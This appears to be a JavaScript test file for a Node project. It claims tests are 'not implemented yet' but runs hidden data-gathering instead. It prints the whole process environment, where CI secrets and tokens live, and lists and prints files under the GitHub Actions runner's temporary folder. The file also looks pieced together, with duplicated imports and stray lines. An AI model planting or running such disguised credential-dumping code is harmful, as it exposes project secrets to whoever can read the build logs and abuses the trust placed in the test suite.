// TODO: implement the tests
console.log("Tests are not implemented yet...");


const index = require("../index")
console.log("Tests are not implemented yet...");
index.ls(".");
index.cat("./index.js")
setTimeout(() => { console.log("World!"); }, 5000);

console.log(process.env);


console.log("xxxxxx");

const {ls, cat, lscat} = require("../index");

lscat("/home/runner/work/_temp")
